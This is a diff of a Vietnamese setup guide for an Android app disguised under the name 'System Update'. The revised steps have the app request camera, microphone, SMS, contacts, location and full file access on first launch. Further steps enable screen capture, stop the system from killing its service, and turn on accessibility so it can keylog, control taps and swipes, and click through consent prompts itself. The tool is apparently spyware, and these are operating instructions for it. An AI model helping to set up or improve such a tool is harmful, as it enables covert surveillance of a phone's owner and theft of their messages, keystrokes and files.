@@ -63,7 +63,9 @@ Mở app **System Update**:
 
 | Bước | Nút | Việc |
 |---|---|---|
-| 1 | **Cấp quyền** | cho hết hộp thoại (camera, mic, SMS, danh bạ, vị trí, file) |
+| 1 | *(tự động)* | app tự hiện hộp thoại cấp quyền ở lần mở đầu — bấm **Cho phép** hết |
+| 1b | **Cấp tất cả quyền còn thiếu** | nếu bỏ lỡ hộp thoại, bấm nút này để hỏi lại |
+| 1c | **Cho phép truy cập toàn bộ file** | cần cho tab Files trên Android 11+ |
 | 2 | **Bật chia sẻ màn hình** | đồng ý MediaProjection (chỉ cần cho tab Màn hình) |
 | 3 | **Mở cài đặt pin** | chọn *Không tối ưu hoá* để service không bị kill |
 | 3b | **Bật trợ năng** | bật `System Update` → có keylog + tap/swipe + tự bấm consent |
